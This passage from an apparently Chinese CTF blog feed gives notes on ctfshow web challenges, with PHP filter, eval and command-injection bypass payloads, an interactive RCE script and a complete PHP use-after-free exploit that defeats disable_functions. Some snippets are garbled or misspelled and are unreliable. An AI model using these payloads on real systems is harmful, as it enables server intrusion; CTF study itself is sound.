&lt;p&gt;但都可以用82脚本跑出，第一个为脚本中session的设置，第二个为线程的作用，刚删但刚写&lt;/p&gt;
&lt;h1 id=&#34;web-85&#34;&gt;&lt;a href=&#34;#web-85&#34; class=&#34;headerlink&#34; title=&#34;web 85&#34;&gt;&lt;/a&gt;web 85&lt;/h1&gt;&lt;p&gt;虽然有对内容”&amp;lt;”的判断，但还是可以通过上面代码进行，增加线程即可&lt;/p&gt;
&lt;h1 id=&#34;web-87&#34;&gt;&lt;a href=&#34;#web-87&#34; class=&#34;headerlink&#34; title=&#34;web 87&#34;&gt;&lt;/a&gt;web 87&lt;/h1&gt;&lt;p&gt;改为写文件了，可以使用过滤器&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;php://filter/write=string.rot13/resource=2.php
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为是对file的解码，因此对file的内容进行两次url编码，上传后，访问2.php文件即可&lt;/p&gt;
&lt;h1 id=&#34;web-88&#34;&gt;&lt;a href=&#34;#web-88&#34; class=&#34;headerlink&#34; title=&#34;web 88&#34;&gt;&lt;/a&gt;web 88&lt;/h1&gt;&lt;p&gt;data 协议，base64 编码，构造出不带 =，+ 号的编码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;data://text/plain;base64,&amp;lt;?php system(&#39;ls&#39;);?&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;web-117&#34;&gt;&lt;a href=&#34;#web-117&#34; class=&#34;headerlink&#34; title=&#34;web 117&#34;&gt;&lt;/a&gt;web 117&lt;/h1&gt;&lt;p&gt;伪协议，过滤器，死亡绕过&lt;/p&gt;
&lt;p&gt;通过转码使得院死亡代码无效，使自己的代码有效&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php
&lt;/code&gt;&lt;/pre&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://dpm12345.cn/posts/b013ba57/</guid>
            <title>信息收集 爆破 命令执行</title>
            <link>http://dpm12345.cn/posts/b013ba57/</link>
            <category>CTF</category>
            <category>ctfshow</category>
            <pubDate>Tue, 04 Oct 2022 22:11:40 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;信息收集&#34;&gt;&lt;a href=&#34;#信息收集&#34; class=&#34;headerlink&#34; title=&#34;信息收集&#34;&gt;&lt;/a&gt;信息收集&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;robots #&lt;/li&gt;
&lt;li&gt;域名解析 #&lt;/li&gt;
&lt;li&gt;.git&lt;code&gt;.svn&lt;/code&gt;.swp &lt;/li&gt;
&lt;li&gt;editor 编辑器 如果访问一个不存在的目录，那么会列出根目录的所有文件 &lt;/li&gt;
&lt;li&gt;邮箱 qq 号泄漏部分信息 &lt;/li&gt;
&lt;li&gt;探针访问默认的 tz.php &lt;/li&gt;
&lt;li&gt;ip 访问，cdn 缓存清除 / 绕过，可加 www 绕过 &lt;/li&gt;
&lt;li&gt;Unicode 编码（可使用控制台输出) &lt;/li&gt;
&lt;li&gt;前端密码验证 可以绕过前端 js 直接 post 传入 &lt;/li&gt;
&lt;li&gt;access 数据库 db 目录下的 data.mdb db.mdb&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;爆破&#34;&gt;&lt;a href=&#34;#爆破&#34; class=&#34;headerlink&#34; title=&#34;爆破&#34;&gt;&lt;/a&gt;爆破&lt;/h1&gt;&lt;ol&gt;
&lt;li&gt;域名爆破子域名 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3BocGluZm8ubWUv&#34;&gt;phpinfo.me&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;php_mt_seed&lt;/li&gt;
&lt;li&gt;\uxx 可以用 consoleolog&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;命令执行&#34;&gt;&lt;a href=&#34;#命令执行&#34; class=&#34;headerlink&#34; title=&#34;命令执行&#34;&gt;&lt;/a&gt;命令执行&lt;/h1&gt;&lt;h2 id=&#34;Linux-中的-cp-命令&#34;&gt;&lt;a href=&#34;#Linux-中的-cp-命令&#34; class=&#34;headerlink&#34; title=&#34;Linux 中的 cp 命令&#34;&gt;&lt;/a&gt;Linux 中的 cp 命令&lt;/h2&gt;&lt;p&gt;利用cp命令将flag.php写入1.txt，然后访问1.txt&lt;/p&gt;
&lt;p&gt;&lt;code&gt;system (&#34;cp fla?.php 1.txt&#34;);&lt;/code&gt;(对 flag 进行过滤)（mv 也行）&lt;/p&gt;
&lt;h2 id=&#34;system-过滤可以使用反引号绕过，反引号作用相当于-system&#34;&gt;&lt;a href=&#34;#system-过滤可以使用反引号绕过，反引号作用相当于-system&#34; class=&#34;headerlink&#34; title=&#34;system 过滤可以使用反引号绕过，反引号作用相当于 system&#34;&gt;&lt;/a&gt;system 过滤可以使用反引号绕过，反引号作用相当于 system&lt;/h2&gt;&lt;h2 id=&#34;嵌套-eval，主要用于过滤了相应查找的函数&#34;&gt;&lt;a href=&#34;#嵌套-eval，主要用于过滤了相应查找的函数&#34; class=&#34;headerlink&#34; title=&#34;嵌套 eval，主要用于过滤了相应查找的函数&#34;&gt;&lt;/a&gt;嵌套 eval，主要用于过滤了相应查找的函数&lt;/h2&gt;&lt;p&gt;payload:&lt;code&gt;?a=eval($_GET[1]);&amp;amp;1=phpinfo();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;1&lt;/code&gt; 已经逃逸，可以使用任何命令&lt;/p&gt;
&lt;p&gt;(可以使用 system (“tac flag.php”) 直接查看源码)(tac 为 cat 的逆序)&lt;/p&gt;
&lt;h2 id=&#34;分号被-ban&#34;&gt;&lt;a href=&#34;#分号被-ban&#34; class=&#34;headerlink&#34; title=&#34;分号被 ban&#34;&gt;&lt;/a&gt;分号被 ban&lt;/h2&gt;&lt;p&gt;可以使用文件包含的方法，&lt;code&gt;include%0a$_GET [1]&amp;amp;1=phpinfo();&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;此时1已经逃逸，若想查看文件内容，可使用php伪协议，base-64编码查看 (同时可以把include换成require)&lt;/p&gt;
&lt;h2 id=&#34;data-协议&#34;&gt;&lt;a href=&#34;#data-协议&#34; class=&#34;headerlink&#34; title=&#34;data 协议&#34;&gt;&lt;/a&gt;data 协议&lt;/h2&gt;&lt;p&gt;&lt;code&gt;data://text/plain,(php代码)&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;web-40&#34;&gt;&lt;a href=&#34;#web-40&#34; class=&#34;headerlink&#34; title=&#34;web 40&#34;&gt;&lt;/a&gt;web 40&lt;/h2&gt;&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;if (isset($_GET[&#39;c&#39;])) {
    $c = $_GET[&#39;c&#39;];
    eval($c);
} else {
    highlight_file(__FILE__);
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;可用&lt;code&gt;show_source(next(array_reverse(scandir(pos(loc)lecony))));&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者&lt;code&gt;?c=eval(arry_pop(next(get_difined_vars())));&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;其中 &lt;code&gt;get_defined_vars()&lt;/code&gt;,获取所有的变量值，之前可以进行打印，可以发现有 post 传值，传入后会有显示，那么需要拿到传上的值， &lt;/p&gt;
&lt;p&gt;由于 post 在第二个，可用 next 获取下一个，&lt;code&gt;array_pop()&lt;/code&gt;弹出，然后使用&lt;code&gt;eval&lt;/code&gt;执行&lt;/p&gt;
&lt;p&gt;执行过程&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/%E5%9B%BE%E7%89%87/web40_1.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/../../../../post_images/%E5%9B%BE%E7%89%87/web40_2.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;可看到由于传值，使得post有值了&lt;/p&gt;
&lt;p&gt;那么接下来就是获取并执行&lt;/p&gt;
&lt;h2 id=&#34;web-41&#34;&gt;&lt;a href=&#34;#web-41&#34; class=&#34;headerlink&#34; title=&#34;web 41&#34;&gt;&lt;/a&gt;web 41&lt;/h2&gt;&lt;p&gt;这个题过滤了&lt;code&gt;$、+、-、^、~&lt;/code&gt;使得异或自增和取反构造字符都无法使用，同时过滤了字母和数字。但是特意留了个或运算符 |。&lt;/p&gt;
&lt;p&gt;我们可以尝试从 ascii 为 0-255 的字符中，找到或运算能得到我们可用的字符的字符。&lt;/p&gt;
&lt;p&gt;这里先给出两个脚本&lt;code&gt;exp.py``rce_or.php&lt;/code&gt;，大家以后碰到可以使用或运算绕过的可以自己手动修改下即可。&lt;/p&gt;
&lt;p&gt;生成可用字符的集合&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;&amp;lt;?php
$myfile = fopen(&#34;rce_or.txt&#34;, &#34;w&#34;);
$contents=&#34;&#34;;
for ($i=0; $i &amp;lt; 256; $i++) { 
    for ($j=0; $j &amp;lt;256 ; $j++) { 

        if($i&amp;lt;16){
            $hex_i=&#39;0&#39;.dechex($i);
        }
        else{
            $hex_i=dechex($i);
        }
        if($j&amp;lt;16){
            $hex_j=&#39;0&#39;.dechex($j);
        }
        else{
            $hex_j=dechex($j);
        }
        $preg = &#39;/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\{|\}|\&amp;amp;|\-/i&#39;;
        if(preg_match($preg , hex2bin($hex_i))||preg_match($preg , hex2bin($hex_j))){
                    echo &#34;&#34;;
    }
  
        else{
        $a=&#39;%&#39;.$hex_i;
        $b=&#39;%&#39;.$hex_j;
        $c=(urldecode($a)|urldecode($b));
        if (ord($c)&amp;gt;=32&amp;amp;ord($c)&amp;lt;=126) {
            $contents=$contents.$c.&#34; &#34;.$a.&#34; &#34;.$b.&#34;\n&#34;;
        }
    }

}
}
fwrite($myfile,$contents);
fclose($myfile);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;大体意思就是&lt;code&gt;从进行异或的字符中排除掉被过滤的，然后再判断异或得到的字符是否为可见字符&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;传递参数&lt;code&gt;getflag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;脚本&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;# -*- coding: utf-8 -*-
import requests
import urllib
from sys import *
import os
os.system(&#34;php rce_or.php&#34;)  #没有将 php 写入环境变量需手动运行
if(len(argv)!=2):
    print(&#34;=&#34;*50)
       print(&#39;USER：python exp.py &amp;lt;url&amp;gt;&#39;)
       print(&#34;eg：  python exp.py http://ctf.show/&#34;)
       print(&#34;=&#34;*50)
       exit(0)
url=argv[1]
def action(arg):
       s1=&#34;&#34;
       s2=&#34;&#34;
       for i in arg:
           f=open(&#34;rce_or.txt&#34;,&#34;r&#34;)
           while True:
               t=f.readline()
               if t==&#34;&#34;:
                   break
               if t[0]==i:
                   #print(i)
                   s1+=t[2:5]
                   s2+=t[6:9]
                   break
           f.close()
       output=&#34;(\&#34;&#34;+s1+&#34;\&#34;|\&#34;&#34;+s2+&#34;\&#34;)&#34;
       return(output)
   
while True:
       param=action(input(&#34;\n[+] your function：&#34;) )+action(input(&#34;[+] your command：&#34;))
       data={
           &#39;c&#39;:urllib.parse.unquote(param)
           }
       r=requests.post(url,data=data)
       print(&#34;\n[*] result:\n&#34;+r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;                             -- 来源于[ yu22x 的博客文章](https://blog.csdn.net/miuzzx/article/details/108569080)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web-42&#34;&gt;&lt;a href=&#34;#web-42&#34; class=&#34;headerlink&#34; title=&#34;web 42&#34;&gt;&lt;/a&gt;web 42&lt;/h2&gt;&lt;p&gt;双写绕过，分号分隔，分号后面被写入&lt;/p&gt;
&lt;h2 id=&#34;web-43&#34;&gt;&lt;a href=&#34;#web-43&#34; class=&#34;headerlink&#34; title=&#34;web 43&#34;&gt;&lt;/a&gt;web 43&lt;/h2&gt;&lt;p&gt;源码类型同42，但过滤了分号和&lt;code&gt;cat&lt;/code&gt;，可以使用&lt;code&gt;&amp;amp;&amp;amp;&lt;/code&gt;, 用来分隔两个命令，如果前一个执行成功第二个不会执行&lt;/p&gt;
&lt;h2 id=&#34;web-50、51&#34;&gt;&lt;a href=&#34;#web-50、51&#34; class=&#34;headerlink&#34; title=&#34;web 50、51&#34;&gt;&lt;/a&gt;web 50、51&lt;/h2&gt;&lt;p&gt;不用空格的命令&lt;/p&gt;
&lt;p&gt;&lt;code&gt;?c=nl&amp;lt;fla&#39;&#39;g.php%7C%7Cls&lt;/code&gt;(&lt;code&gt;%7C%7C&lt;/code&gt; 为&lt;code&gt;||&lt;/code&gt;) 其中不用通配符是因为不支持，使用单引号忽略&lt;/p&gt;
&lt;h2 id=&#34;web-55&#34;&gt;&lt;a href=&#34;#web-55&#34; class=&#34;headerlink&#34; title=&#34;web 55&#34;&gt;&lt;/a&gt;web 55&lt;/h2&gt;&lt;p&gt;无字母 RCE&lt;/p&gt;
&lt;p&gt;可以上传文件到服务器上&lt;/p&gt;
&lt;p&gt;在本地制作文件上传表单&lt;/p&gt;
&lt;p&gt;而上传后php会把该文件放在一个临时目录下，命名规则为 php+5 位小写字母 + 大写字母，但该文件名不可控，可以使用占位符进行匹配&lt;/p&gt;
&lt;p&gt;&lt;code&gt;/???/????????&lt;/code&gt;而如果最后有大写字母，也可以写成&lt;code&gt;/???/???????[@-[]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;如果点号 . 没有过滤，在linux系统里可以使用点号. 用来执行脚本文件，即可写&lt;code&gt;?c=.%20/???/??????[@-[]&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后通过抓包不断修改文件的内容&lt;/p&gt;
&lt;h2 id=&#34;web-57&#34;&gt;&lt;a href=&#34;#web-57&#34; class=&#34;headerlink&#34; title=&#34;web 57&#34;&gt;&lt;/a&gt;web 57&lt;/h2&gt;&lt;p&gt;题目只要构造出 36 即可，而 $ 没有过滤，可以使用 $(()) 进行构造&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo $(())&lt;/code&gt;返回0，取反后&lt;code&gt;echo $((~$(())))&lt;/code&gt;即为-1，那么我们可以加上37个-1再取反&lt;/p&gt;
&lt;p&gt;&lt;code&gt;echo ~$(($((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))+$((~$(())))))&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;返回36&lt;/p&gt;
&lt;h2 id=&#34;web-62、63、64&#34;&gt;&lt;a href=&#34;#web-62、63、64&#34; class=&#34;headerlink&#34; title=&#34;web 62、63、64&#34;&gt;&lt;/a&gt;web 62、63、64&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;code&gt;include(&#34;flag.php&#34;);echo $flag;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;或者先 include 包含 flag.php，再使用 get_defined_vars (), 获取变量名及值&lt;/li&gt;
&lt;li&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;web-66&#34;&gt;&lt;a href=&#34;#web-66&#34; class=&#34;headerlink&#34; title=&#34;web 66&#34;&gt;&lt;/a&gt;web 66&lt;/h2&gt;&lt;p&gt;&lt;code&gt;var_dump(scandir(&#39;*&#39;));var_dump(scandir (&#39;/&#39;));&lt;/code&gt;读取相关的目录&lt;/p&gt;
&lt;h2 id=&#34;web-68&#34;&gt;&lt;a href=&#34;#web-68&#34; class=&#34;headerlink&#34; title=&#34;web 68&#34;&gt;&lt;/a&gt;web 68&lt;/h2&gt;&lt;p&gt;&lt;code&gt;highlight_file&lt;/code&gt;被禁，用&lt;code&gt;include&lt;/code&gt;，&lt;code&gt;include (&#39;/flag.txt&#39;);&lt;/code&gt;因为没有php代码，则直接输出&lt;/p&gt;
&lt;h2 id=&#34;web-71&#34;&gt;&lt;a href=&#34;#web-71&#34; class=&#34;headerlink&#34; title=&#34;web 71&#34;&gt;&lt;/a&gt;web 71&lt;/h2&gt;&lt;p&gt;内容被替换&lt;/p&gt;
&lt;p&gt;思路为提前结束，不执行下面的代码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;include(&#39;flag.txt&#39;);exit();&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;web-72&#34;&gt;&lt;a href=&#34;#web-72&#34; class=&#34;headerlink&#34; title=&#34;web 72&#34;&gt;&lt;/a&gt;web 72&lt;/h2&gt;&lt;p&gt;&lt;code&gt;var_dump()&lt;/code&gt;被禁&lt;/p&gt;
&lt;p&gt;&lt;code&gt;scandir(&#39;/&#39;)&lt;/code&gt;不能正确读取，因为有了&lt;code&gt;open_basedir()&lt;/code&gt;, 而&lt;code&gt;ini_set ()&lt;/code&gt;也被禁用，不能修改&lt;/p&gt;
&lt;p&gt;那么可以使用&lt;code&gt;glob&lt;/code&gt;协议进行绕过&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;c=$a=&#34;glob:///*.txt&#34;;
if($b = opendir($a)){
    while(($file = readdir($b))!== false ){
        echo &#34;filename:&#34;.$file.&#34;\n&#34;;
    }
    closedir($b);
}
exit();// 为了绕过后面的替换内容
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;虽然知道flag的文件名，但是无法读取&lt;/p&gt;
&lt;p&gt;xxxxxxxxxx&amp;nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;?&amp;gt;&amp;lt;?php
pwn(&#34;cat /flag0.txt&#34;);
function pwn($cmd) {
    global $abc, $helper, $backtrace;
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this-&amp;gt;a);
            $backtrace = (new Exception)-&amp;gt;getTrace(); # ;)
            if(!isset($backtrace[1][&#39;args&#39;])) { # PHP &amp;gt;= 7.4
                $backtrace = debug_backtrace();
            }
        }
    }
    class Helper {
        public $a, $b, $c, $d;
    }
    function str2ptr(&amp;amp;$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j &amp;gt;= 0; $j--) {
            $address &amp;lt;&amp;lt;= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
    function ptr2str($ptr, $m = 8) {
        $out = &#34;&#34;;
        for ($i=0; $i &amp;lt; $m; $i++) {
            $out .= sprintf(&#34;%c&#34;,($ptr &amp;amp; 0xff));
            $ptr &amp;gt;&amp;gt;= 8;
        }
        return $out;
    }
    function write(&amp;amp;$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i &amp;lt; $n; $i++) {
            $str[$p + $i] = sprintf(&#34;%c&#34;,($v &amp;amp; 0xff));
            $v &amp;gt;&amp;gt;= 8;
        }
    }
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper-&amp;gt;a);
        if($s != 8) { $leak %= 2 &amp;lt;&amp;lt; ($s * 8) - 1; }
        return $leak;
    }
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
        for($i = 0; $i &amp;lt; $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
            if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 6) { # PT_LOAD, PF_Read_Write
                # handle pie
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 &amp;amp;&amp;amp; $p_flags == 5) { # PT_LOAD, PF_Read_exec
                $text_size = $p_memsz;
            }
        }
        if(!$data_addr || !$text_size || !$data_size)
            return false;
        return [$data_addr, $text_size, $data_size];
    }
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i &amp;lt; $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;constant&#39; constant check
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base &amp;gt; 0 &amp;amp;&amp;amp; $leak - $base &amp;lt; $data_addr - $base) {
                $deref = leak($leak);
                # &#39;bin2hex&#39; constant check
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
            return $data_addr + $i * 8;
        }
    }
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak &amp;amp; 0xfffffffffffff000;
        for($i = 0; $i &amp;lt; 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) { # ELF header
                return $addr;
            }
        }
    }
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
            if($f_name == 0x6d6574737973) { # system
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
    function my_str_repeat($a,$b){
        $s = &#39;&#39;;
        for($i = 0; $i &amp;lt;= $b;$i++){
            $s.=$a;
        }  
        return $s;
    }
    function trigger_uaf($arg) {
        # str_shuffle prevents opcache string interning
        $arg = str_shuffle(my_str_repeat(&#39;A&#39;, 79));
        $vuln = new Vuln();
        $vuln-&amp;gt;a = $arg;
    }
    if(stristr(PHP_OS, &#39;WIN&#39;)) {
        die(&#39;This PoC is for *nix systems only.&#39;);
    }
    $n_alloc = 10; # increase this value if UAF fails
    $contiguous = [];
    for($i = 0; $i &amp;lt; $n_alloc; $i++)
        $contiguous[] = str_shuffle(my_str_repeat(&#39;A&#39;, 79));
    trigger_uaf(&#39;x&#39;);
    $abc = $backtrace[1][&#39;args&#39;][0];
    $helper = new Helper;
    $helper-&amp;gt;b = function ($x) { };
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die(&#34;UAF failed&#34;);
    }
    # leaks
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
    # fake value
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    # fake reference
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die(&#34;Couldn&#39;t determine binary base address&#34;);
    }
    if(!($elf = parse_elf($base))) {
        die(&#34;Couldn&#39;t parse ELF header&#34;);
    }
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die(&#34;Couldn&#39;t get basic_functions address&#34;);
    }
    if(!($zif_system = get_system($basic_funcs))) {
        die(&#34;Couldn&#39;t get zif_system address&#34;);
    }
    # fake closure object
    $fake_obj_offset = 0xd0;
    for($i = 0; $i &amp;lt; 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
    # pwn
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); # internal func type
    write($abc, 0xd0 + 0x68, $zif_system); # internal func handler
    ($helper-&amp;gt;b)($cmd);
    exit();
}
exit();
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web-75&#34;&gt;&lt;a href=&#34;#web-75&#34; class=&#34;headerlink&#34; title=&#34;web 75&#34;&gt;&lt;/a&gt;web 75&lt;/h2&gt;&lt;p&gt;先通过glob读取文件目录&lt;/p&gt;
&lt;p&gt;用数据库pdo读取&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;try {
        $dbh = new  PDO(&#39;mysql : host=localhost ; dbname=ctftraining&#39;, &#39; root&#39;, &#39; root&#39;);
        foreach ($dbh-&amp;gt;query(&#39;select- load_ file(&#34;/flag36.txt&#34;) &#39;) as  $row) {
            echo ($row[0]) . &#34;I&#34;;
        }
        $dbh = null;
    } catch (PDOException $e) {
        echo $e-&amp;gt;getMessage();
        exit(0);
    }
    exit(0);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web-77&#34;&gt;&lt;a href=&#34;#web-77&#34; class=&#34;headerlink&#34; title=&#34;web 77&#34;&gt;&lt;/a&gt;web 77&lt;/h2&gt;&lt;p&gt;盲测特性&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;c=$ffi = FFl:cdef(&#34;int system(const char *command);&#34;);
$a=&#39;/readflag&amp;gt; 1.txt&#39;;
ff-&amp;gt;system($a);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web-118&#34;&gt;&lt;a href=&#34;#web-118&#34; class=&#34;headerlink&#34; title=&#34;web 118&#34;&gt;&lt;/a&gt;web 118&lt;/h2&gt;&lt;p&gt;&lt;code&gt;${PATH:~A}${PWD:~A}$IFS????.???&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;nl 命令&lt;/p&gt;
&lt;h2 id=&#34;web-119&#34;&gt;&lt;a href=&#34;#web-119&#34; class=&#34;headerlink&#34; title=&#34;web 119&#34;&gt;&lt;/a&gt;web 119&lt;/h2&gt; ]]></description>
        </item>
    </channel>
</rss>
